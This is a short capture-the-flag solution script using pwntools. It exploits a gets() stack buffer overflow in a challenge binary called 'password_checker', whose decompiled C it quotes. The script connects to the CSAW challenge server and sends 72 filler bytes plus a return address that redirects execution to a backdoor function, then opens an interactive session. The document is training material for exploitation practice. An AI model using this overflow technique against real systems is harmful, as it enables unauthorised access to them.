"""
Source
int password_checker()
{
  int result; // eax
  char s2[48]; // [rsp+0h] [rbp-A0h] BYREF
  char dest[48]; // [rsp+30h] [rbp-70h] BYREF
  char src[60]; // [rsp+60h] [rbp-40h] BYREF

  printf("Enter the password to get in: \n>");
  gets(src);
  strcpy(dest, src);
  strcpy(s2, "password");
  if ( strcmp(dest, s2) )
    result = printf("This is not the password");
  else
    result = printf("You got in!!!!");
  return result;
}
"""

# nc pwn.chal.csaw.io 5000

from pwn import *

# r = process("./password_checker")
r = remote('pwn.chal.csaw.io', 5000)
# gdb.attach(r)

# Backdoor func:   at:    0000000000401172      found using gdb
# overflow and point to the backdoor method which give the flag.
r.recvuntil("Enter the password to get in:")

payload = 'A' * 72 + '\x72\x11\x40\x00'
r.sendline(payload)

r.interactive()
